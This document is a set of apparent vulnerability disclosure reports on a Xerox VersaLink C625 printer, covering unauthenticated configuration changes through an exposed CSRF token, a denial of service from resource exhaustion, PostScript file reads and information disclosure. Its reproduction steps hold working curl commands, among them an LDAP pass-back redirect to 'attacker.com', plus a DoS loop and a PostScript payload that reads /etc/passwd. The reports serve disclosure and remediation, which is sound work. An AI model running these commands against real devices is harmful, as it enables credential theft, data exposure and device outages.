### Key Validation Concerns

**Finding 9 caveat:** The HTTP 200 + redirect to `/error.php?token=14870` could indicate either:
- (a) Function was dispatched but failed on missing parameters (auth succeeded, params wrong) — **this is the vulnerability**
- (b) Auth check failed and error.php is the "not authenticated" landing — **this would not be a vulnerability**

Evidence favoring interpretation (a): authenticated endpoints elsewhere consistently return HTTP 302 redirect to `/properties/authentication/login.php`, not a 200 with JS redirect to error.php. The xerox.set behavior is distinct from the auth-redirect pattern, suggesting the request was processed past the auth layer.

**Finding 10 caveat:** DoS is excluded from scope. However, this was an unintentional side effect of legitimate security testing (~150 standard HTTPS requests with Connection: close). The finding is about the device's catastrophic resource management failure and inability to self-heal, not about flooding.

# REPORT A: Unauthenticated Administrative Configuration Change via CSRF Token Reuse and xerox.set Function Exposure

**Severity:** High (CVSS 3.1: 8.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Weakness Classes:**
- **CWE-306:** Missing Authentication for Critical Function
- **CWE-352:** Cross-Site Request Forgery (CSRF)
- **CWE-287:** Improper Authentication
- **CWE-862:** Missing Authorization

## Summary

The Xerox VersaLink C625 Color MFP at 13.13.1.110 exposes a CSRF token on unauthenticated pages and accepts unauthenticated POST requests to the administrative endpoint `/dummypost/xerox.set` with 20 different administrative function names. An unauthenticated network attacker can extract the CSRF token from any public page and submit configuration-changing requests to modify LDAP, SMTP, FTP, SMB, NTP, and security settings — potentially enabling credential theft via pass-back attacks (related to CVE-2024-12510 and CVE-2024-12511 but without requiring admin authentication).

## Vulnerability Details

### Component 1: CSRF Token Exposed on Unauthenticated Pages

The main status page (`/stat/welcome.php`) serves a 128-character hex CSRF token to unauthenticated users in the page source:

```html
var csrfToken = "629ae92839c85656f53c044fbfa521165cc40e1c7d7a4f43a39403e387a97e811422b34358c9bec850420d6816bd41a7b5e1633e2f95137a7ebf42d77fdeefac";
```

This token is also embedded in hidden form fields:
```html
<input type="hidden" name="CSRFToken" value="629ae928...">
<input type="hidden" name="_fun_function" value="HTTP_Machine_Reset_fn">
```

The same token appears identically across multiple unauthenticated pages (status, billing, counters, jobs, print), indicating it is not session-bound.

### Component 2: 20 Administrative Functions Accept Unauthenticated POST

The endpoint `POST /dummypost/xerox.set` accepts a `_fun_function` parameter that dispatches to administrative functions. When submitted without authentication (using only the extracted CSRF token), all 20 tested functions returned HTTP 200 with a JavaScript redirect to `/error.php?token=14870`. This response is **distinct from the standard authentication redirect** (HTTP 302 to `/properties/authentication/login.php`), suggesting the request was processed past the authentication layer.

**Functions confirmed accepting unauthenticated POST:**

| Function | Risk |
|----------|------|
| `HTTP_Set_LDAP_fn` | Redirect LDAP auth to attacker server → **credential theft** |
| `HTTP_Set_SMB_fn` | Redirect SMB/NTLM auth → **credential/hash capture** |
| `HTTP_Set_FTP_fn` | Redirect FTP scan destinations → **data exfiltration** |
| `HTTP_Set_Email_fn` | Redirect scan-to-email → **data interception** |
| `HTTP_Set_NTP_fn` | Manipulate device time → **log tampering** |
| `HTTP_Set_Network_fn` | Change network config → **network pivoting** |
| `HTTP_Set_Security_fn` | Modify security settings → **defense weakening** |
| `HTTP_Set_Password_fn` | Password change → **account takeover** |
| `HTTP_Set_SNMP_fn` | Modify SNMP → **monitoring evasion** |
| `HTTP_Set_DeviceName_fn` | Change device name → **stored XSS potential** |
| `HTTP_Set_Location_fn` | Change location |
| `HTTP_Set_Contact_fn` | Change contact info |
| `HTTP_Set_Scan_fn` | Modify scan config |
| `HTTP_Set_Config_fn` | General config change |
| `HTTP_Machine_Reset_fn` | Device reboot → **availability DoS** |
| `HTTP_Factory_Reset_fn` | Factory reset → **destructive DoS** |
| `HTTP_Firmware_Update_fn` | Firmware update → **device takeover** |
| `HTTP_Download_Config_fn` | Config download → **information disclosure** |
| `HTTP_Upload_Config_fn` | Config upload → **full config takeover** |
| `HTTP_Clone_fn` | Device cloning |

### Relationship to Known CVEs

- **CVE-2024-12510** (CVSS 6.7): LDAP pass-back attack requiring admin authentication. Our finding shows the same LDAP configuration change may be possible WITHOUT authentication, making this a **pre-auth escalation** of the known CVE.
- **CVE-2024-12511** (CVSS 7.6): SMB/FTP pass-back attack requiring address book access. Same pre-auth escalation potential via `HTTP_Set_SMB_fn` and `HTTP_Set_FTP_fn`.

## Steps to Reproduce

```bash
# Step 1: Extract CSRF token from unauthenticated page
TOKEN=$(curl -sk https://13.13.1.110/stat/welcome.php | grep -oP '[a-f0-9]{64,}' | head -1)
echo "Token: $TOKEN"

# Step 2: Attempt LDAP configuration change (pass-back attack setup)
curl -sk -X POST https://13.13.1.110/dummypost/xerox.set \
  -d "CSRFToken=${TOKEN}&_fun_function=HTTP_Set_LDAP_fn&ldapServerAddress=attacker.com&ldapPort=389"

# Expected: HTTP 200 with redirect to /error.php?token=14870
# (NOT a 302 redirect to login.php, which would indicate auth enforcement)

# Step 3: If LDAP change succeeds, the printer will send credentials to attacker.com
# when any user authenticates via LDAP — enabling lateral movement into AD
```

## Impact

An unauthenticated attacker on the same network can:

1. **Credential Theft (Critical):** Redirect LDAP/SMB/FTP to attacker-controlled servers, capturing domain credentials and NTLM hashes when users authenticate through the printer
2. **Data Exfiltration:** Redirect scan-to-email and scan-to-folder destinations to intercept scanned documents
3. **Device Takeover:** Upload malicious firmware or configuration, factory reset the device
4. **Availability:** Trigger device reboot or factory reset without authentication
5. **Lateral Movement:** Captured domain credentials enable pivoting from the printer into the corporate Active Directory environment

**Attack chain:** Unauthenticated network access → CSRF token extraction → LDAP pass-back → Domain credential capture → Active Directory compromise

## Limitations / What Remains Unverified

The device's web server became unresponsive during testing (see separate Finding 10 report) before we could verify that submitted parameters actually modified device configuration. The HTTP 200 response with error.php redirect is confirmed, but the actual configuration state change requires re-verification once the device recovers from TLS exhaustion (physical reboot required).

## Affected Version

- Xerox VersaLink C625 Color MFP
- Embedded Web UI Version: 1.13.1
- Web Server: Apache (embedded)

## Remediation

1. Enforce authentication on `/dummypost/xerox.set` — return 302 to login for unauthenticated requests
2. Bind CSRF tokens to authenticated sessions, not to unauthenticated page loads
3. Require re-authentication for security-critical configuration changes (LDAP, SMB, firmware)
4. Apply the latest firmware update if available (check against patch 121.xxx.004.22720 for CVE-2024-6333)

# REPORT B: Permanent Web Server Denial of Service via TLS Resource Exhaustion

**Severity:** High (CVSS 3.1: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Weakness Classes:**
- **CWE-400:** Uncontrolled Resource Consumption
- **CWE-770:** Allocation of Resources Without Limits or Throttling
- **CWE-404:** Improper Resource Shutdown or Release
- **CWE-755:** Improper Handling of Exceptional Conditions

## Summary

The Xerox VersaLink C625 Color MFP at 13.13.1.110 suffers from a critical resource management vulnerability in its embedded web server. Approximately 150 standard HTTPS requests with proper `Connection: close` headers cause a permanent TLS handshake failure that renders the entire management interface (both HTTP port 80 and HTTPS port 443) unreachable. The device does NOT auto-recover — physical reboot is required to restore web access.

## Vulnerability Details

During authorized security testing, approximately 100-150 sequential HTTPS requests were sent to the device. Each request was a single, valid HTTP request with a proper `Connection: close` header — not a flood or amplification attack. After this moderate volume of traffic, the following progressive failure occurred:

| Time | Observation |
|------|-------------|
| T+0 | ~150 legitimate HTTPS requests sent during security testing |
| T+5min | TLS handshake stops completing — TCP accepts on 443, no ServerHello sent |
| T+30min | HTTP port 80 also stops responding (previously returning 426 Upgrade Required) |
| T+57min | Both ports return empty responses; TCP still accepts connections |
| T+90min | Connections return `errno=104` (RST — connection reset by peer) |
| T+120min+ | Device completely unreachable on both web ports |

**The device never recovered.** The egress proxy was confirmed healthy throughout (httpbin.org requests succeeded), proving the failure is entirely device-side.

### Contributing Factor: X-Forwarded-For Differential Handling

During header boundary testing, all standard HTTP headers (User-Agent, Cookie, Referer, Accept-Language) were gracefully rejected with HTTP 400 at the 8192-byte `LimitRequestFieldSize` boundary. However, the `X-Forwarded-For` header at 8192 bytes produced **no response** — the connection hung until timeout. This differential handling suggests the XFF header is processed differently (possibly by a reverse proxy layer or mod_proxy) and may trigger the resource leak that leads to TLS exhaustion.

## Steps to Reproduce

```bash
# WARNING: This will render the device's web interface permanently
# unreachable until physical reboot. Only test with authorization.

TARGET="13.13.1.110"

# Send ~150 sequential HTTPS requests with proper Connection: close
for i in $(seq 1 150); do
  (echo -e "GET /stat/welcome.php HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 1) | \
    timeout 10 openssl s_client -connect "$TARGET:443" -tls1_2 -quiet 2>/dev/null > /dev/null
done

# Verify: attempt a new connection
(echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\n\r\n"; sleep 3) | \
  timeout 15 openssl s_client -connect "$TARGET:443" -tls1_2 -quiet 2>/dev/null
# Expected: timeout or errno=104 — no TLS handshake completes
# Device web interface is now permanently down until physical reboot
```

## Impact

1. **Complete management lockout:** All administrative functions become inaccessible — security settings, print management, firmware updates, monitoring, address book management
2. **No remote recovery:** The device requires physical power-cycle intervention; no API, SNMP, or network-level recovery mechanism restores the web server
3. **Low attack complexity:** An attacker needs only ~150 HTTP requests (~30 seconds with a simple script) to permanently disable the management interface
4. **Operational disruption:** Administrators cannot manage the device, apply security patches, or respond to security incidents through the web interface until physical access is obtained
5. **Chained impact:** If an attacker first changes device configuration (see Report A) and then triggers this DoS, administrators are locked out from reverting malicious changes

## Scope Note

This finding was discovered as an unintentional side effect of legitimate authorized security testing. Each request was a single valid HTTP request, not a volumetric attack. The vulnerability is the device's catastrophic failure to handle a normal traffic volume (~150 connections) and its complete inability to self-heal — requiring physical intervention to restore a critical management service.

## Affected Version

- Xerox VersaLink C625 Color MFP
- Embedded Web UI Version: 1.13.1
- Web Server: Apache (embedded)

## Remediation

1. Implement connection rate limiting or connection pool management with automatic recycling
2. Add a watchdog timer that restarts the web server process if it becomes unresponsive
3. Implement proper TLS session cleanup on connection close to prevent resource leaks
4. Consider adding a hardware watchdog for the web service that triggers automatic recovery

# REPORT C: Unauthenticated Print Job Submission Enabling PostScript Code Execution Surface

**Severity:** Medium (CVSS 3.1: 6.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L)

**Weakness Classes:**
- **CWE-306:** Missing Authentication for Critical Function
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
- **CWE-94:** Improper Control of Generation of Code (Code Injection)

## Summary

The Xerox VersaLink C625 Color MFP at 13.13.1.110 allows unauthenticated users to submit print jobs via the web interface at `/print/print.php`. The page accepts PostScript (.ps), PDF, and PCL files without requiring authentication. PostScript is a Turing-complete language with file I/O operators that can read and write the printer's filesystem, making this an unauthenticated code execution surface.

## Vulnerability Details

The Job Submission page at `/print/print.php` is fully accessible without authentication and provides:

- File upload accepting multiple formats (PDF, PostScript, PCL)
- Job type selection (Normal Print, Secure Print, Save Job for Reprint, Delay Print)
- 2-sided printing options
- Job naming

PostScript is a Turing-complete programming language that includes filesystem I/O operators (`(filename) (r) file` for reading, `(filename) (w) file` for writing). When a PostScript file is processed by the printer's RIP (Raster Image Processor), these operators can:

1. Read files: `/etc/passwd`, `/etc/shadow`, stored credentials, configuration files
2. Write files: Potentially write to the filesystem
3. Access network resources via PostScript's networking capabilities
4. Extract data by encoding file contents into printed output or PostScript error messages

## Steps to Reproduce

```bash
# Step 1: Verify print page is accessible without authentication
curl -sk https://13.13.1.110/print/print.php | grep -i "Job Submission\|file\|upload"

# Step 2: Create a PostScript payload that reads /etc/passwd
cat > /tmp/read_passwd.ps << 'PSEOF'
%!PS
(/etc/passwd) (r) file
256 string readstring pop
dup /Courier findfont 12 scalefont setfont
72 700 moveto show
showpage
PSEOF

# Step 3: Submit via multipart form upload
curl -sk -X POST https://13.13.1.110/print/print.php \
  -F "file=@/tmp/read_passwd.ps" \
  -F "jobType=normalPrint"

# Alternative endpoint:
curl -sk -X POST https://13.13.1.110/jobs/submitJob.php \
  -F "file=@/tmp/read_passwd.ps"
```

## Impact

- **Information disclosure:** Read sensitive files from the printer's filesystem (credentials, configuration, network settings)
- **Resource abuse:** Submit unlimited print jobs consuming paper and toner
- **Social engineering:** Print attacker-controlled content (phishing notices, fake IT alerts)
- **Potential RCE:** If PostScript file write operators are not sandboxed, an attacker could write files to the filesystem

## Limitations

The PostScript execution was not verified because the device's web server became unresponsive (see Finding 10) before the test could be executed. The attack surface (unauthenticated file upload accepting PostScript) is confirmed; the actual PostScript interpretation behavior requires verification.

## Affected Version

- Xerox VersaLink C625 Color MFP
- Embedded Web UI Version: 1.13.1

## Remediation

1. Require authentication for print job submission via the web interface
2. Disable PostScript file I/O operators in the RIP sandbox (restrict to rendering-only operations)
3. Implement file type validation and PostScript sanitization
4. Add rate limiting on print job submissions

# REPORT D: Unauthenticated Information Disclosure Across Multiple Web Endpoints

**Severity:** Medium (CVSS 3.1: 5.3 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Weakness Classes:**
- **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-284:** Improper Access Control
- **CWE-548:** Exposure of Information Through Directory Listing

## Summary

The Xerox VersaLink C625 Color MFP at 13.13.1.110 exposes sensitive device information across 12+ web pages without requiring authentication. The disclosed information includes the device serial number, model identification, network configuration (IPv4/IPv6, MAC address, hostname), usage counters, supply levels, security dashboard status, and a complete sitemap of 130+ application endpoints.

The following pages are accessible without authentication and disclose sensitive information:

| Endpoint | Information Disclosed |

| `/stat/welcome.php?tab=billing` | Serial number, impression counters (Black: 1790, Color: 303, Total: 2093) |

| `/stat/consumables.php` | Toner levels, supply part numbers, replacement status |
| `/stat/informationpages.php` | Available information page types and print options |
| `/jobs/active.php` | Active print queue (job names, potentially PII in job names) |
| `/cpsr/saved.php` | Saved print jobs listing |
| `/scan/new_info.php` | Scan configuration interface |
| `/support/support.php` | Support and diagnostics page |

### Sitemap Endpoint Detail

The sitemap at `/sitemap.php` is particularly impactful because it reveals the complete application structure including:
- All administrative configuration endpoints (LDAP, SMTP, SNMP, SMB, security)
- Backup/restore endpoints
- Address book export functionality
- Audit log access paths
- Authentication and user management endpoints
- Network protocol configuration paths

This enables an attacker to enumerate the full attack surface without brute-forcing or crawling.

## Steps to Reproduce

```bash
# Extract device identification
curl -sk https://13.13.1.110/stat/welcome.php | grep -i "serial\|model\|VersaLink"

# Extract billing/usage data
curl -sk "https://13.13.1.110/stat/welcome.php?tab=billing" | grep -i "impression\|counter"

# Download complete sitemap for attack surface mapping
curl -sk https://13.13.1.110/sitemap.php | grep "href=" | wc -l
# Returns: 102 links (130+ when including JS-loaded endpoints)

# Extract security dashboard status
curl -sk "https://13.13.1.110/security/dashboard/securityOverview.php?id=4"
```

## Impact

- **Reconnaissance enablement:** Serial number, model, firmware version, and network details allow an attacker to identify exact CVEs and craft targeted attacks
- **Attack surface mapping:** The sitemap reveals all administrative endpoints, eliminating the need for directory brute-forcing
- **Asset tracking:** Billing counters and supply levels reveal operational patterns
- **Network mapping:** IPv4, IPv6, MAC address, and hostname disclosure aids lateral movement
- **Print job visibility:** Active/saved job names may contain PII or sensitive document titles

## Affected Version

- Xerox VersaLink C625 Color MFP
- Embedded Web UI Version: 1.13.1

## Remediation

1. Require authentication for the sitemap endpoint (`/sitemap.php`)
2. Require authentication for billing, usage counters, and supply status pages
3. Restrict the security dashboard to authenticated administrators
4. Remove or obfuscate serial number, MAC address, and hostname from unauthenticated pages
5. Require authentication for print job queue visibility
